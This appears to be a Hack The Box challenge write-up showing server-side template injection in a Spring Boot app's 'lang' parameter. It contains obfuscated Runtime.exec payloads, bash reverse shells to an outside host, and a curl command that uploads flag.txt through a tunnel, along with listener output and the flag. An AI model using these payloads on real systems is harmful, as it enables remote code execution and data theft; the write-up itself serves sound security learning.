Tags: `SSTI`, `Spring Boot`, `Pentesting`, `HTB`

I opened with vs code the app: 

![](Screenshots/Pasted%20image%2020250115115245.png)
## Code review
Inspecting the code I realized that the flag redirection is strange: 
![](Screenshots/Pasted%20image%2020250115142751.png)

We can manipulate the redirection of "lang +'/index' " to have access to the flag.txt

We can see that the controller takes the `lang` parameter and appends `/index` to it to resolve a view. The dangerous part here is the concatenation of the `lang` parameter, which can be exploited for Server-Side Template Injection (SSTI).

#### Exploiting SSTI

To exploit the SSTI vulnerability, I tried injecting a simple template expression to check if the server evaluates it. First I tried with a raw injection "${7*7}", but it didn't  work: 

![](Screenshots/Pasted%20image%2020250115164826.png)

I tried to encode the url ([[../../../../Theory/Vulnerabilities/SSTI/URL encoding]]): 
![](Screenshots/Pasted%20image%2020250115171853.png)

I searched on google some information about SSTI in springboot and I finally found something that works correctly ([SSTI(Server Side Template Injection) · Janger's pentesting cheat sheets](https://devjanger.github.io/web-hackings/ssti/)), I tried `__${7*7}__::.x` :
![](Screenshots/Pasted%20image%2020250115172044.png)

If I try to execute a java command it's impossible due to a java validation: `94.237.54.42:52587/?lang=__%24{7*7}__%3A%3A.x`: 
![](Screenshots/Pasted%20image%2020250115172901.png)

I obfuscate a command that use java, but returns a process, not a string, __${(1).class.forName('ja' + 'va.lang.Runt' + 'ime').getRuntime().exec('whoami').}__::.x -> 
![](Screenshots/Pasted%20image%2020250115180348.png)
I try some commands to do a reverse shell [GitHub - welk1n/ReverseShell-Java: Generating payloads to reverse shell in different contexts of java.](https://github.com/welk1n/ReverseShell-Java): 

[Breathtaking View - Hack The Box | Pentest Everything](https://retherszu.github.io/ctf/hack-the-box/challenges/web/breathtaking-view.html#breathtaking-view)
[Breathtaking View | Write-Ups](https://mux1337.gitbook.io/write-up-_/hack-the-box/challenges/web/breathtaking-view)

The command has to be like:
`__${(1).class.forName('ja' + 'va.lang.Runt' + 'ime').getRuntime().exec('bash -i >& /dev/tcp/10.10.16.93/1234 0>&1')}__::.x`

Testing:

```bash
┌──(javnievic㉿kali)-[~/Challenges/Breathtaking_View]
└─$ lt --port 1234
your url is: https://slimy-sheep-chew.loca.lt 
```
```bash
──(javnievic㉿kali)-[~/Challenges/Breathtaking_View]
└─$ nc -nlvp 1234 -vv
listening on [any] 1234 ...
connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 52392
 sent 0, rcvd 0
```
                                      
   __${(1).class.forName('ja' + 'va.lang.Runt' + 'ime').getRuntime().exec('curl https://slimy-sheep-chew.loca.lt -T flag.txt')}__::.x ->


Finally:
We have to update the dependencies: 
`__${(1).class.forName('ja' + 'va.lang.Runt' + 'ime').getRuntime().exec("apt update")}__::.x`

After that we have to install curl: 
`__${(1).class.forName('ja' + 'va.lang.Runt' + 'ime').getRuntime().exec("apt install -y curl")}__::.x`

We have to activate a tunnel with another ip: 
```bash
┌──(javnievic㉿kali)-[~/Challenges/Breathtaking_View]
└─$ lt --port 1234
your url is: https://rude-papayas-marry.loca.lt
listening on [any] 1234 ...
```

Then we can activate netcat: 

```bash
┌──(javnievic㉿kali)-[~/Challenges/Breathtaking_View]
└─$ nc -nlvp 1234 -vv
```
We introcude again this:
`__${(1).class.forName('ja' + 'va.lang.Runt' + 'ime').getRuntime().exec('bash -c "bash -i >& /dev/tcp/rude-papayas-marry.loca.lt/1234 0>&1"')}__::.x`
...

Finally: 
```bash
connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 55764
PUT /flag.txt HTTP/1.1
accept: */*
user-agent: curl/7.74.0
content-length: 21
x-forwarded-port: 443
x-forwarded-ssl: on
x-forwarded-proto: https
x-forwarded-for: 94.237.63.132
x-real-ip: 94.237.63.132
connection: close
host: rude-papayas-marry.loca.lt
x-forwarded-host: rude-papayas-marry.loca.lt

HTB{whAt_4_v1ewWwww!} sent 0, rcvd 332
```
